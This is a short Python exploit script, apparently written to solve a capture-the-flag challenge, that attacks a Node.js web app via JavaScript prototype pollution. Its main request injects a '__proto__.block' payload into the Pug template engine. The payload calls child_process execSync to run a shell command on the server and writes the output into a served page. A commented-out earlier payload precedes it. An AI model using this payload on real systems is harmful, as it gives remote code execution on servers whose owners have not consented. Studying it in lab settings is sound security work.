import requests,html

# excerpt from https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution

host = "http://167.99.89.198:31971"
# r = requests.post(host+"/api/submit", json={
#     "artist.name": "Haigh",
#     "__proto__": {
#         "return res.json({\'response\': pug.compile(\'test: penetrated\')({ user: \'guest\' })});": "test",
#         "console.log(\"penetrated\")": "test"}
#         })

# RCE using javascript prototype pollution
command = "ls * >> views/index.html"
r = requests.post(host + '/api/submit', json = {
    'artist.name':'Haigh',
    '__proto__.block': {
        'type': 'Text', 
        'line': f'console.log(process.mainModule.require("child_process").execSync("{command}").toString())'
    },
    'loc': {
        'start': 0,
        'end': 0
    }
})
answer = html.unescape(r.text)

print(answer)
print(r.raw)
